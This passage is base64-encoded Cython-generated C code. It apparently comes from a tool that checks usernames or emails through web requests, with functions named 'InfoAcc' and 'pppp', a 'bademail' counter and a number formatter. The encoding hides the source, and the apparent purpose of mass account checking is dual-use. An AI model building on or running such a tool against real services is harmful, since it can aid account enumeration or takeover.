DIpKSB7CiAgICAgICAgICAgICAgaWYgKHNpemUgPiAyKSBfX1B5eF9SYWlzZVRvb01hbnlWYWx1ZXNFcnJvcigyKTsKICAgICAgICAgICAgICBlbHNlIGlmIChzaXplID49IDApIF9fUHl4X1JhaXNlTmVlZE1vcmVWYWx1ZXNFcnJvcihzaXplKTsKICAgICAgICAgICAgICBfX1BZWF9FUlIoMCwgMzMyLCBfX3B5eF9MM19lcnJvcikKICAgICAgICAgICAgfQogICAgICAgICAgICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAgICAgICAgICAgaWYgKGxpa2VseShQeVR1cGxlX0NoZWNrRXhhY3Qoc2VxdWVuY2UpKSkgewogICAgICAgICAgICAgIF9fcHl4X3RfNSA9IFB5VHVwbGVfR0VUX0lURU0oc2VxdWVuY2UsIDApOwogICAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpOwogICAgICAgICAgICAgIF9fcHl4X3RfMTQgPSBQeVR1cGxlX0dFVF9JVEVNKHNlcXVlbmNlLCAxKTsKICAgICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xNCk7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlMaXN0X0dldEl0ZW1SZWYoc2VxdWVuY2UsIDApOwogICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDMzMiwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpOwogICAgICAgICAgICAgIF9fcHl4X3RfMTQgPSBfX1B5eF9QeUxpc3RfR2V0SXRlbVJlZihzZXF1ZW5jZSwgMSk7CiAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE0KSkgX19QWVhfRVJSKDAsIDMzMiwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE0KTsKICAgICAgICAgICAgfQogICAgICAgICAgICAjZWxzZQogICAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeVNlcXVlbmNlX0lURU0oc2VxdWVuY2UsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAzMzIsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgICAgICAgX19weXhfdF8xNCA9IF9fUHl4X1B5U2VxdWVuY2VfSVRFTShzZXF1ZW5jZSwgMSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xNCkpIF9fUFlYX0VSUigwLCAzMzIsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xNCk7CiAgICAgICAgICAgICNlbmRpZgogICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgUHlfc3NpemVfdCBpbmRleCA9IC0xOwogICAgICAgICAgICBfX3B5eF90XzYgPSBQeU9iamVjdF9HZXRJdGVyKF9fcHl4X3RfMTApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAzMzIsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgICAgICAgX19weXhfdF8xNyA9IChDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJKSA/IFB5SXRlcl9OZXh0IDogX19QeXhfUHlPYmplY3RfR2V0SXRlck5leHRGdW5jKF9fcHl4X3RfNik7CiAgICAgICAgICAgIGluZGV4ID0gMDsgX19weXhfdF81ID0gX19weXhfdF8xNyhfX3B5eF90XzYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIGdvdG8gX19weXhfTDI0X3VucGFja2luZ19mYWlsZWQ7CiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgICAgICAgICBpbmRleCA9IDE7IF9fcHl4X3RfMTQgPSBfX3B5eF90XzE3KF9fcHl4X3RfNik7IGlmICh1bmxpa2VseSghX19weXhfdF8xNCkpIGdvdG8gX19weXhfTDI0X3VucGFja2luZ19mYWlsZWQ7CiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE0KTsKICAgICAgICAgICAgaWYgKF9fUHl4X0l0ZXJuZXh0VW5wYWNrRW5kQ2hlY2soX19weXhfdF8xNyhfX3B5eF90XzYpLCAyKSA8ICgwKSkgX19QWVhfRVJSKDAsIDMzMiwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgICAgIF9fcHl4X3RfMTcgPSBOVUxMOwogICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICAgICAgZ290byBfX3B5eF9MMjVfdW5wYWNraW5nX2RvbmU7CiAgICAgICAgICAgIF9fcHl4X0wyNF91bnBhY2tpbmdfZmFpbGVkOjsKICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgICAgIF9fcHl4X3RfMTcgPSBOVUxMOwogICAgICAgICAgICBpZiAoX19QeXhfSXRlckZpbmlzaCgpID09IDApIF9fUHl4X1JhaXNlTmVlZE1vcmVWYWx1ZXNFcnJvcihpbmRleCk7CiAgICAgICAgICAgIF9fUFlYX0VSUigwLCAzMzIsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgICBfX3B5eF9MMjVfdW5wYWNraW5nX2RvbmU6OwogICAgICAgICAgfQogICAgICAgICAgX19weXhfdl91c2VybmFtZSA9IF9fcHl4X3RfNTsKICAgICAgICAgIF9fcHl4X3RfNSA9IDA7CiAgICAgICAgICBfX3B5eF92X2dnID0gX19weXhfdF8xNDsKICAgICAgICAgIF9fcHl4X3RfMTQgPSAwOwoKICAgICAgICAgIAogICAgICAgICAgX19weXhfdF8xNCA9IE5VTEw7CiAgICAgICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0luZm9BY2MpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAzMzMsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgICAgICBfX3B5eF90XzEzID0gMTsKICAgICAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgICAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzUpKSkgewogICAgICAgICAgICBfX3B5eF90XzE0ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF81KTsKICAgICAgICAgICAgYXNzZXJ0KF9fcHl4X3RfMTQpOwogICAgICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNSk7CiAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzE0KTsKICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF81LCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgICAgICBfX3B5eF90XzEzID0gMDsKICAgICAgICAgIH0KICAgICAgICAgICNlbmRpZgogICAgICAgICAgewogICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbM10gPSB7X19weXhfdF8xNCwgX19weXhfdl91c2VybmFtZSwgX19weXhfdl9nZ307CiAgICAgICAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzUsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMTMsICgzLV9fcHl4X3RfMTMpIHwgKF9fcHl4X3RfMTMqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNCk7IF9fcHl4X3RfMTQgPSAwOwogICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDMzMywgX19weXhfTDNfZXJyb3IpCiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTsKICAgICAgICAgIH0KICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7CiAgICAgICAgfQogICAgICAgIF9fcHl4X0wyMTo7CgogICAgICAgIAogICAgICAgIGdvdG8gX19weXhfTDIwOwogICAgICB9CgogICAgICAKICAgICAgIHsKICAgICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9iYWRlbWFpbCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAzMzUsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTsKICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeUxvbmdfQWRkT2JqQyhfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMSwgMSwgMSwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDMzNSwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2JhZGVtYWlsLCBfX3B5eF90XzUpIDwgKDApKSBfX1BZWF9FUlIoMCwgMzM1LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKCiAgICAgICAgCiAgICAgICAgX19weXhfdF8xMCA9IE5VTEw7CiAgICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzE0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcHBwcCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xNCkpIF9fUFlYX0VSUigwLCAzMzYsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE0KTsKICAgICAgICBfX3B5eF90XzEzID0gMTsKICAgICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfMTQpKSkgewogICAgICAgICAgX19weXhfdF8xMCA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfMTQpOwogICAgICAgICAgYXNzZXJ0KF9fcHl4X3RfMTApOwogICAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzE0KTsKICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzEwKTsKICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzE0LCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgICAgX19weXhfdF8xMyA9IDA7CiAgICAgICAgfQogICAgICAgICNlbmRpZgogICAgICAgIHsKICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzEwLCBOVUxMfTsKICAgICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMTQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMTMsICgxLV9fcHl4X3RfMTMpIHwgKF9fcHl4X3RfMTMqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzE0KTsgX19weXhfdF8xNCA9IDA7CiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAzMzYsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgICAgfQogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICB9CiAgICAgIF9fcHl4X0wyMDo7CgogICAgICAKICAgIH0KICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgIGdvdG8gX19weXhfTDhfdHJ5X2VuZDsKICAgIF9fcHl4X0wzX2Vycm9yOjsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNCk7IF9fcHl4X3RfMTQgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE1KTsgX19weXhfdF8xNSA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTYpOyBfX3B5eF90XzE2ID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKCiAgICAKICAgICB7CiAgICAgIF9fUHl4X0VyclJlc3RvcmUoMCwwLDApOwogICAgICBnb3RvIF9fcHl4X0w0X2V4Y2VwdGlvbl9oYW5kbGVkOwogICAgfQogICAgX19weXhfTDRfZXhjZXB0aW9uX2hhbmRsZWQ6OwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMik7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzMpOwogICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xLCBfX3B5eF90XzIsIF9fcHl4X3RfMyk7CiAgICBfX3B5eF9MOF90cnlfZW5kOjsKICB9CgogIAoKICAKICBfX3B5eF9yID0gUHlfTm9uZTsgX19QeXhfSU5DUkVGKFB5X05vbmUpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9vKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfdGwpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9ob3N0KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfY29va2llcyk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2hlYWRlcnMpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9wYXJhbXMpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9kYXRhKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfcmVzcG9uc2UpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9vayk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3VzZXJuYW1lKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfZ2cpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9lbWFpbCk7CiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIF9fcHl4X3I7Cn0KCgoKCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMm5lXzEzZm9ybWF0X251bWJlcihQeU9iamVjdCAqX19weXhfc2VsZiwgCiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTApQeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzCiNlbHNlClB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZW5kaWYKKTsgCnN0YXRpYyBQeU1ldGhvZERlZiBfX3B5eF9tZGVmXzJuZV8xM2Zvcm1hdF9udW1iZXIgPSB7ImZvcm1hdF9udW1iZXIiLCAoUHlDRnVuY3Rpb24pKHZvaWQoKikodm9pZCkpKF9fUHl4X1B5Q0Z1bmN0aW9uX0Zhc3RDYWxsV2l0aEtleXdvcmRzKV9fcHl4X3B3XzJuZV8xM2Zvcm1hdF9udW1iZXIsIF9fUHl4X01FVEhfRkFTVENBTEx8TUVUSF9LRVlXT1JEUywgMH07CnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMm5lXzEzZm9ybWF0X251bWJlcihQeU9iamVjdCAqX19weXhfc2VsZiwgCiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTApQeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzCiNlbHNlClB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZW5kaWYKKSB7CiAgUHlPYmplY3QgKl9fcHl4X3ZfdmFsdWUgPSAwOwogICNpZiAhQ1lUSE9OX01FVEhfRkFTVENBTEwKICBDWVRIT05fVU5VU0VEIFB5X3NzaXplX3QgX19weXhfbmFyZ3M7CiAgI2VuZGlmCiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqY29uc3QgKl9fcHl4X2t3dmFsdWVzOwogIFB5T2JqZWN0KiB2YWx1ZXNbMV0gPSB7MH07CiAgaW50IF9fcHl4X2xpbmVubyA9IDA7CiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMOwogIGludCBfX3B5eF9jbGluZW5vID0gMDsKICBQeU9iamVjdCAqX19weXhfciA9IDA7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiZm9ybWF0X251bWJlciAod3JhcHBlcikiLCAwKTsKICAjaWYgIUNZVEhPTl9NRVRIX0ZBU1RDQUxMCiAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX0dFVF9TSVpFKF9fcHl4X2FyZ3MpOwogICNlbHNlCiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX1NpemUoX19weXhfYXJncyk7IGlmICh1bmxpa2VseShfX3B5eF9uYXJncyA8IDApKSByZXR1cm4gTlVMTDsKICAjZW5kaWYKICAjZW5kaWYKICBfX3B5eF9rd3ZhbHVlcyA9IF9fUHl4X0t3VmFsdWVzX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIF9fcHl4X25hcmdzKTsKICB7CiAgICBQeU9iamVjdCAqKiBjb25zdCBfX3B5eF9weWFyZ25hbWVzW10gPSB7Jl9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV92YWx1ZSwwfTsKICAgIGNvbnN0IFB5X3NzaXplX3QgX19weXhfa3dkc19sZW4gPSAoX19weXhfa3dkcykgPyBfX1B5eF9OdW1Ld2FyZ3NfRkFTVENBTEwoX19weXhfa3dkcykgOiAwOwogICAgaWYgKHVubGlrZWx5KF9fcHl4X2t3ZHNfbGVuKSA8IDApIF9fUFlYX0VSUigwLCAzNDEsIF9fcHl4X0wzX2Vycm9yKQogICAgaWYgKF9fcHl4X2t3ZHNfbGVuID4gMCkgewogICAgICBzd2l0Y2ggKF9fcHl4X25hcmdzKSB7CiAgICAgICAgY2FzZSAgMToKICAgICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7CiAgICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMF0pKSBfX1BZWF9FUlIoMCwgMzQxLCBfX3B5eF9MM19lcnJvcikKICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7CiAgICAgICAgY2FzZSAgMDogYnJlYWs7CiAgICAgICAgZGVmYXVsdDogZ290byBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjsKICAgICAgfQogICAgICBjb25zdCBQeV9zc2l6ZV90IGt3ZF9wb3NfYXJncyA9IF9fcHl4X25hcmdzOwogICAgICBpZiAoX19QeXhfUGFyc2VLZXl3b3JkcyhfX3B5eF9rd2RzLCBfX3B5eF9rd3ZhbHVlcywgX19weXhfcHlhcmduYW1lcywgMCwgdmFsdWVzLCBrd2RfcG9zX2FyZ3MsIF9fcHl4X2t3ZHNfbGVuLCAiZm9ybWF0X251bWJlciIsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgMzQxLCBfX3B5eF9MM19lcnJvcikKICAgICAgZm9yIChQeV9zc2l6ZV90IGkgPSBfX3B5eF9uYXJnczsgaSA8IDE7IGkrKykgewogICAgICAgIGlmICh1bmxpa2VseSghdmFsdWVzW2ldKSkgeyBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgiZm9ybWF0X251bWJlciIsIDEsIDEsIDEsIGkpOyBfX1BZWF9FUlIoMCwgMzQxLCBfX3B5eF9MM19lcnJvcikgfQogICAgICB9CiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzICE9IDEpKSB7CiAgICAgIGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7CiAgICB9IGVsc2UgewogICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7CiAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDM0MSwgX19weXhfTDNfZXJyb3IpCiAgICB9CiAgICBfX3B5eF92X3ZhbHVlID0gdmFsdWVzWzBdOwogIH0KICBnb3RvIF9fcHl4X0w2X3NraXA7CiAgX19weXhfTDVfYXJndHVwbGVfZXJyb3I6OwogIF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJmb3JtYXRfbnVtYmVyIiwgMSwgMSwgMSwgX19weXhfbmFyZ3MpOyBfX1BZWF9FUlIoMCwgMzQxLCBfX3B5eF9MM19lcnJvcikKICBfX3B5eF9MNl9za2lwOjsKICBnb3RvIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lOwogIF9fcHl4X0wzX2Vycm9yOjsKICBmb3IgKFB5X3NzaXplX3QgX19weXhfdGVtcD0wOyBfX3B5eF90ZW1wIDwgKFB5X3NzaXplX3QpKHNpemVvZih2YWx1ZXMpL3NpemVvZih2YWx1ZXNbMF0pKTsgKytfX3B5eF90ZW1wKSB7CiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7CiAgfQogIF9fUHl4X0FkZFRyYWNlYmFjaygibmUuZm9ybWF0X251bWJlciIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBOVUxMOwogIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lOjsKICBfX3B5eF9yID0gX19weXhfcGZfMm5lXzEyZm9ybWF0X251bWJlcihfX3B5eF9zZWxmLCBfX3B5eF92X3ZhbHVlKTsKCiAgCiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkgewogICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pOwogIH0KICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gX19weXhfcjsKfQoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8ybmVfMTJmb3JtYXRfbnVtYmVyKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF92X3ZhbHVlKSB7CiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMOwogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgUHlPYmplY3QgKl9fcHl4X3RfMSA9IE5VTEw7CiAgaW50IF9fcHl4X3RfMjsKICBQeU9iamVjdCAqX19weXhfdF8zID0gTlVMTDsKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJmb3JtYXRfbnVtYmVyIiwgMCk7CiAgX19QeXhfSU5DUkVGKF9fcHl4X3ZfdmFsdWUpOwoKICAKICBfX3B5eF90XzEgPSBfX1B5eF9QeU51bWJlcl9GbG9hdChfX3B5eF92X3ZhbHVlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMzQyLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3ZfdmFsdWUsIF9fcHl4X3RfMSk7CiAgX19weXhfdF8xID0gMDsKCiAgCiAgX19weXhfdF8xID0gUHlPYmplY3RfUmljaENvbXBhcmUoX19weXhfdl92YWx1ZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzEwMDAwMDAsIFB5X0dFKTsgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzNDMsIF9fcHl4X0wxX2Vycm9yKQogIF9fcHl4X3RfMiA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzEpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfMiA8IDApKSkgX19QWVhfRVJSKDAsIDM0MywgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgaWYgKF9fcHl4X3RfMikgewoKICAgIAogICAgX19QeXhfWERFQ1JFRihfX3B5eF9yKTsKICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5TG9uZ19UcnVlRGl2aWRlT2JqQyhfX3B5eF92X3ZhbHVlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMTAwMDAwMCwgMHhGNDI0MCwgMCwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDM0NCwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdChfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMWYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAzNDQsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5VW5pY29kZV9Db25jYXRJblBsYWNlKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X20pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAzNDQsIF9fcHl4